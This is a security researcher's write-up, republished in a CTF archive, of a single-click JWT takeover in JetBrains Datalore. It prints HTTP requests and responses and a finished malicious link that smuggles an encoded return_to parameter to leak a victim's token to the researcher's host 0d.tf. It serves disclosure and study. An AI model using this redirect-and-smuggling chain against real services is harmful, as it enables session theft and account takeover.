# :globe_with_meridians: Eye for an eye: Unusual single click JWT token takeover

> **Original Source:** [Eye for an eye: Unusual single click JWT token takeover](https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Eye for an eye: Unusual single click JWT token takeover


## This story is about an unusual open redirect misconfiguration I found in JetBrains Datalore.


### Description


The story begins when I found an open redirect in one of the Datalore endpoints. The endpoint relates to authentication via JetBrains Account. At first, this redirector looked harmless, but, anyway, I decided to look closer at how the authentication process works.


```
Request:GET /jetbrains_auth?jwt={token}&return_to=https://0d.tf/ HTTP/1.1
Host: datalore.jetbrains.com
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Connection: closeResponse:HTTP/1.1 302
Date: Tue, 01 Jun 2021 19:50:54 GMT
Content-Length: 0
Connection: close
Set-Cookie: route={route}; Path=/; Secure; HttpOnly
Set-Cookie: DATALORESESSIONID={session-id}; Path=/; Secure; HttpOnly
Location: https://0d.tf/
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
X-Content-Type-Options: nosniff
X-XSS-Protection: 1
```


I’ve checked the endpoint which initiates redirects to the Datalore with JWT token, and here’s how the request looks like:


```
Request:GET /jwt-auth/datalore?auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1
Host: http://account.jetbrains.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: closeResponse:HTTP/1.1 302
Date: Tue, 01 Jun 2021 10:00:54 GMT
Content-Length: 0
Connection: close
Server: nginx
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: -1
Location: https://datalore.jetbrains.com/jetbrains_auth?jwt={jwt-token-here}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
```


As you can see, it takes the address of the target host in the `auth_url` query parameter.


Here are some interesting facts about the parameter:


- The address can be any subdomain of jetbrains.com

- You can supply the path and query parameters within the URL


I got an idea to smuggle a valid JWT token as part of the `auth_url` parameter, and here is what happened next:


```
Request:GET /jwt-auth/datalore?auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth?jwt={attacker's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1
Host: http://account.jetbrains.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: closeResponse:HTTP/1.1 302
Date: Tue, 01 Jun 2021 10:00:54 GMT
Content-Length: 0
Connection: close
Server: nginx
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: -1
Location: https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt-token}?jwt={victim's-jwt-token}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
```


The endpoint returned a Location header with both JWT tokens in query parameters. The first one — supplied by me as part of `auth_url`, and the second was from JetBrains Account.


## Get Yurii Sanin’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


As a next step, I tried to smuggle the `return_to` parameter as part of `auth_url`. The idea is quite simple — it will allow me to place a valid JWT token as the first parameter and add the victim’s JWT as part of the smuggled `return_to` parameter.


```
Attacker's host:
&return_to=https%3A%2F%2F0d.tfUrl encoded attacker's host: %26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%
```


So, the final malicious link looks like this:


```
https://account.jetbrains.com/jwt-auth/datalore?auth_url=https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's_jwt}%26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%66&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
```


Here’s what is going to happen if someone opens the link:


```
1. 302 Redirect -> https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt}&return_to=https%3A%2F%2F0d.tf?jwt={victim's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
2. 302 Redirect -> https://0d.tf?jwt={victim's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
3. JWT TOKEN -> Application session
```

---

*Originally published on [Medium](https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
